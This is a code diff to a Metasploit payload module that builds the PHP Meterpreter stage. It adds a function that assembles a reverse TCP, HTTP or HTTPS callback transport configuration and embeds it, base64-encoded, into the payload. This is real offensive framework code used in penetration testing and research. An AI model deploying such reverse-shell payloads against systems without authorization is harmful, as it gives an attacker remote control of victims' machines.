@@ -3,9 +3,9 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'securerandom'
-
 module MetasploitModule
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::UUID::Options
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
@@ -23,16 +23,47 @@ module MetasploitModule
     )
   end
 
+  def generate_config(opts = {})
+    ds = opts[:datastore] || datastore
+    opts[:uuid] ||= generate_payload_uuid
+
+    unless opts[:transport_config]
+      scheme = opts[:scheme] || 'tcp'
+      if scheme == 'https'
+        opts[:transport_config] = [transport_config_reverse_https(opts)]
+      elsif scheme == 'http'
+        opts[:transport_config] = [transport_config_reverse_http(opts)]
+      else
+        opts[:transport_config] = [transport_config_reverse_tcp(opts)]
+      end
+    end
+
+    config_opts = {
+      ascii_str:         true,
+      null_session_guid: opts[:stageless] == true,
+      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid:              opts[:uuid],
+      transports:        opts[:transport_config],
+      stageless:         opts[:stageless] == true,
+    }.merge(meterpreter_logging_config(opts))
+
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config.to_b
+  end
+
   def generate_stage(opts = {})
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
 
-    uuid = opts[:uuid] || generate_payload_uuid
-    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
-    met = met.sub('"PAYLOAD_UUID", ""', "\"PAYLOAD_UUID\", \"#{bytes}\"")
+    # Build the URI from the callback URL if present
+    unless opts[:url].to_s == ''
+      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
+      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
+      opts[:uri] = "#{luri}#{uri}"
+    end
 
-    # Staged payloads need to have a new session GUID
-    session_guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*').chars.map { |c| '\x%.2x' % c.ord }.join('')
-    met = met.sub(%q{"SESSION_GUID", ""}, %("SESSION_GUID", "#{session_guid}"))
+    # Generate the TLV config block containing all transport configuration
+    config_block = Rex::Text.encode_base64(generate_config(opts))
+    met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")
 
     if datastore['MeterpreterDebugBuild']
       met.sub!(%q{define("MY_DEBUGGING", false);}, %|define("MY_DEBUGGING", true);|)
@@ -42,7 +73,6 @@ module MetasploitModule
     end
 
     met.gsub!(/#.*?$/, '')
-    # met = Rex::Text.compress(met)
     met
   end
 end
